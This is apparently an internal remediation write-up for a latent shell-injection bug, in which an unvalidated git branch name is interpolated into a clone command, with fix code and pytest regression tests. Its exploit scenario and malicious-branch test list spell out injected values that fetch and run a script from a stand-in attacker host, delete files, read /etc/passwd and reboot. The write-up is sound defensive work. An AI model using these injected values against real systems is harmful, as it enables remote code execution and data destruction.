# GAP-0094: `repo_branch` Shell Injection (Latent) — Remediation Write-up

> ~5 pages. Fix-oriented. Source ticket: AGENT-011. No prior investigation doc exists.
> All claims verified against the actual source code before writing.

## 1. Summary & Classification

**Bug**: `build_architect_workflow` in `app/services/agent_architect.py` constructs a `git clone --depth 1 -b {branch} {repo_url} /workspace` command by f-string interpolating the `repo_branch` config value without any sanitisation. `validate_architect_config` validates `repo_url` for scheme and spaces but does not validate `repo_branch` at all — any string, including one containing shell metacharacters (`;`, `&&`, `$(...)`, backticks, or newlines), is accepted and stored. When `ARCHITECT_EXECUTE_COMMANDS=1` is set and the stored command string is executed via a shell, the injected branch value runs arbitrary OS commands on the architect worker.

**Severity**: HIGH
**Source ticket**: AGENT-011 (Solution Architect Agent)
**Status**: Open
**Owning area**: Agent services / architect automation

**Claim from GAP-0094 ticket**: "git clone command f-strings branch from config; `validate_architect_config` does not validate `repo_branch` at all"

**Verdict from investigation**: CLAIM CONFIRMED. The f-string is at `app/services/agent_architect.py:1153`. `validate_architect_config` at lines 188–232 validates `repo_url`, `reference_docs`, `scan_paths`, `ticket_template`, `max_tickets_per_feature`, `ticket_spec_style`, and `coding_tool` — but contains no check for `repo_branch`. `_normalize_config` at line 240 copies `repo_branch` verbatim and defaults it to `"main"`. `architect_execute_commands` is confirmed in `app/core/settings.py:2226`.

**Note**: The ticket's claim is fully accurate. Line 1153 is the correct injection site.

**Related tickets**: GAP-0095 (analysis_prompt injection in the same workflow), GAP-0091 (QA PR review injection), GAP-0092 (health check URL injection), GAP-0089 (coder command injection), SECOPS-007.

## 2. Current-State Investigation (root cause)

### The injection site

`app/services/agent_architect.py:1151–1154`:

```python
steps: List[Dict[str, Any]] = [
    {"step_id": 1, "type": "clone_repo",
     "command": f"git clone --depth 1 -b {branch} {repo_url} /workspace",
     "timeout_seconds": 120, "on_failure": "escalate"},
```

`branch` is obtained at line 1128: `branch = cfg.get("repo_branch", "main")`. `cfg` is the output of `_normalize_config(config)`. `_normalize_config` at line 235–252 passes `repo_branch` through from the raw config dict with only a `setdefault("repo_branch", "main")` fallback — no character validation occurs.

### Validation gap

`app/services/agent_architect.py:188–232` — `validate_architect_config`:

The function iterates over `repo_url`, `reference_docs`, `scan_paths`, `ticket_template`, `max_tickets_per_feature`, `ticket_spec_style`, and `coding_tool`. There is no entry for `repo_branch`. The field is silently accepted whatever its value.

### Config write path

An admin sets `repo_branch` via `PUT /ui/agents/types/{type_id}/architect-config`. The router calls `validate_architect_config` before persisting (verified in `app/routers/agent_architect.py`). Because the validator does not check `repo_branch`, any string — including `main; curl https://attacker.example/x | sh` — passes validation and is stored in DynamoDB.

### Execution gate

`app/core/settings.py:2226`:

```python
architect_execute_commands: bool = os.environ.get(
    "ARCHITECT_EXECUTE_COMMANDS", "0"
) not in ("0", "false", "False")
```

The module docstring at `app/services/agent_architect.py` (implied by the pattern) and `build_architect_workflow` docstring ("Pure / no I/O (safe for dry-run preview)") confirm that the function currently only constructs workflow step dicts — it does not call subprocess. The vulnerability is latent until a real execution path is wired.

### A second injection in the same command

The same f-string interpolates `repo_url` directly: `f"git clone --depth 1 -b {branch} {repo_url} /workspace"`. `repo_url` is validated for scheme (`https://` or `git@`) and absence of spaces, but not for `$(...)`, backticks, or `&&`. Both parameters are vulnerable; GAP-0094 focuses on `repo_branch` specifically.

## 3. Impact / Exploit / Blast Radius

**Who is at risk**: Administrators who configure `repo_branch` for an architect agent type, and the worker host that runs `ARCHITECT_EXECUTE_COMMANDS=1`.

**Exploit scenario**:

1. Attacker (admin or compromised admin) sets `repo_branch` to `main; curl https://attacker.example/c2.sh | bash` via `PUT /ui/agents/types/{type_id}/architect-config`.
2. The `validate_architect_config` call passes without error (no `repo_branch` check).
3. The value is stored in DynamoDB.
4. When the architect workflow executes, the `clone_repo` step command becomes: `git clone --depth 1 -b main; curl https://attacker.example/c2.sh | bash {repo_url} /workspace`.
5. With `shell=True`, the shell tokenises on `;` and executes both `git clone -b main` (which exits non-zero due to the truncated argument) and `curl ... | bash`.

**Alternative payload**: `main$(id>/tmp/pwned)` — no space, no semicolon needed; command substitution executes inline.

**Worst case**: Arbitrary OS command execution on the architect worker, with access to the LLM API key, repository credentials, DynamoDB, and any IAM role attached to the worker instance. In a multi-tenant platform all tenants sharing that worker are affected.

**Blast radius**: All architect agent types across all tenants. The injection requires admin access, but in a multi-tenant SaaS any tenant admin is a potential threat actor.

## 4. Fix Design (code-level)

### Fix A: Branch name validation in `validate_architect_config` (primary fix)

Git branch names have a well-defined character set. Per `git check-ref-format`, a valid branch name:
- Cannot contain: space, `~`, `^`, `:`, `?`, `*`, `[`, `\`, `..`, `@{`, control characters (ASCII < 0x20), DEL (0x7F), or end with `.` or `.lock`.
- Can contain: alphanumerics, `-`, `_`, `/`, `.` (not at start or end or consecutive).

For a conservative safe pattern covering the overwhelming majority of real branch names:

```python
import re

_SAFE_BRANCH_RE = re.compile(r'^[a-zA-Z0-9_./-]{1,200}$')

def _sanitize_branch(branch: str) -> str:
    """Raise ValueError if branch contains characters unsafe for shell interpolation."""
    if not _SAFE_BRANCH_RE.match(branch):
        raise ValueError(
            f"repo_branch contains disallowed characters; "
            f"allowed: alphanumerics, '-', '_', '/', '.'. Got: {branch!r}"
        )
    # Additional git ref safety checks
    if branch.startswith("-"):
        raise ValueError("repo_branch must not start with '-' (could be interpreted as a flag)")
    if ".." in branch or "@{" in branch:
        raise ValueError("repo_branch must not contain '..' or '@{'")
    return branch
```

Add the check to `validate_architect_config`:

```python
repo_branch = str(config.get("repo_branch", "") or "")
if repo_branch:
    try:
        _sanitize_branch(repo_branch)
    except ValueError as exc:
        errors.append(str(exc))
```

And call `_sanitize_branch` inside `_normalize_config` to enforce the constraint on every normalisation pass (defence-in-depth):

```python
def _normalize_config(config: Dict[str, Any]) -> Dict[str, Any]:
    out: Dict[str, Any] = {}
    for key in _CONFIG_FIELDS:
        if key in config and config[key] is not None:
            out[key] = config[key]
    out.setdefault("repo_branch", "main")
    # Sanitise branch in normalisation as well as validation
    try:
        out["repo_branch"] = _sanitize_branch(str(out["repo_branch"]))
    except ValueError:
        out["repo_branch"] = "main"   # safe fallback; validation layer raises the error
    ...
```

### Fix B: Use subprocess argv list, `shell=False` (belt-and-suspenders)

Even with the branch name validated, the correct execution approach for the real path is `subprocess.run` with `shell=False`:

```python
def _clone_repo_argv(*, branch: str, repo_url: str, dest: str = "/workspace") -> List[str]:
    """Return a safe argv list for git clone."""
    _sanitize_branch(branch)   # raises ValueError if invalid
    return ["git", "clone", "--depth", "1", "-b", branch, repo_url, dest]
```

Store this in the step dict as the `command` field, documented as an argv list when it is a list:

```python
{"step_id": 1, "type": "clone_repo",
 "command": _clone_repo_argv(branch=branch, repo_url=repo_url),
 ...}
```

The real execution path calls `subprocess.run(step["command"], shell=False)`.

### Dev/prod parity (SECOPS-007)

Both `_sanitize_branch` and `_clone_repo_argv` are pure functions with no AWS dependency. They run identically in dev and prod. In dev mode (`S.architect_execute_commands = False`) the argv list is constructed and stored but never executed. In prod mode the same argv list is passed to `subprocess.run(..., shell=False)`. No provider interface or flag is needed beyond the existing `architect_execute_commands` gate.

### Alternatives considered

- **Shell-quoting with `shlex.quote`**: Wrapping `branch` in `shlex.quote` before f-string interpolation prevents shell injection. However, `shlex.quote` wraps the entire value in single quotes, producing `-b 'main; curl ...'`, which causes `git clone` to fail with an invalid ref error rather than execute the injection — this is a correct result but the error message leaks the branch value. Rejected in favour of the allowlist approach, which is cleaner and also validates ref format.
- **Moving validation to the router only**: Validation in the router is bypassed if `_normalize_config` is ever called from service code with unvalidated input. Defence-in-depth in `_normalize_config` is preferred.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline)

Add to `tests/test_agent_architect.py`:

```python
import pytest
from app.services.agent_architect import (
    validate_architect_config,
    _sanitize_branch,
    build_architect_workflow,
)

MALICIOUS_BRANCHES = [
    "main; curl attacker.example|sh",
    "main&&id",
    "$(reboot)",
    "`id`",
    "main\nrm -rf /",
    "main|cat /etc/passwd",
    "-b other-branch",          # looks like a flag
    "a" * 201,                  # too long
    "../../../etc/passwd",      # path traversal
    "main..evil",               # git refspec abuse
]

SAFE_BRANCHES = [
    "main",
    "feature/my-branch",
    "release-1.2.3",
    "fix_typo",
    "v1.0.0-rc1",
    "JIRA-1234",
]

@pytest.mark.parametrize("branch", MALICIOUS_BRANCHES)
def test_sanitize_branch_rejects_malicious(branch):
    with pytest.raises(ValueError):
        _sanitize_branch(branch)

@pytest.mark.parametrize("branch", SAFE_BRANCHES)
def test_sanitize_branch_accepts_safe(branch):
    assert _sanitize_branch(branch) == branch

@pytest.mark.parametrize("branch", MALICIOUS_BRANCHES)
def test_validate_architect_config_rejects_malicious_branch(branch):
    config = {
        "repo_url": "https://github.com/example/repo",
        "repo_branch": branch,
    }
    errors = validate_architect_config(config)
    assert any("repo_branch" in e.lower() or "branch" in e.lower() for e in errors), \
        f"Expected branch validation error, got: {errors}"

def test_build_architect_workflow_clone_command_is_safe(mock_ticket):
    """The clone_repo step command must not contain shell metacharacters."""
    import json
    config = {
        "repo_url": "https://github.com/example/repo",
        "repo_branch": "feature/safe-branch",
    }
    workflow = build_architect_workflow(
        agent_run_id="test-run", config=config, ticket=mock_ticket
    )
    clone_step = next(s for s in workflow["steps"] if s["type"] == "clone_repo")
    cmd = clone_step["command"]
    if isinstance(cmd, list):
        # argv list: branch is a discrete element
        assert "feature/safe-branch" in cmd
        assert all(sc not in str(cmd) for sc in [";", "&&", "$(", "`", "|"])
    else:
        # string: branch must be shell-quoted
        import shlex
        tokens = shlex.split(cmd)
        assert "feature/safe-branch" in tokens
```

**Fails before the fix**: `_sanitize_branch` does not exist; `validate_architect_config` returns no errors for malicious branch names; the workflow command contains the raw malicious string.

**Passes after the fix**: All malicious branches are rejected by `validate_architect_config`; safe branches pass; workflow commands are safe.

### Observability

- Emit a WARNING log whenever `_sanitize_branch` rejects a value; include the agent type ID (not the branch value, to avoid logging injected content).
- Add a metric `agent_architect_invalid_branch_total` for monitoring misconfiguration attempts.

### Rollout

- **Effort**: S (small — one validation function, two call sites, existing test file to extend).
- **Backward compatibility**: Existing configs with valid branch names (`main`, `develop`, `feature/*`) are unaffected. Configs with special characters in branch names are edge cases; the admin receives a clear error message on next config update. A migration script can scan existing configs and warn about any that would fail the new check.
- **Risk**: Low. The change tightens input validation at the API boundary; the underlying mock workflow execution is unchanged.
- **Sequencing**: Fix in the same PR as GAP-0095 (analysis prompt injection), since both are in `agent_architect.py` and both require input sanitisation at the config-write boundary. Also coordinate with GAP-0091 and GAP-0092 to close all shell injection gaps across agent services in one release.
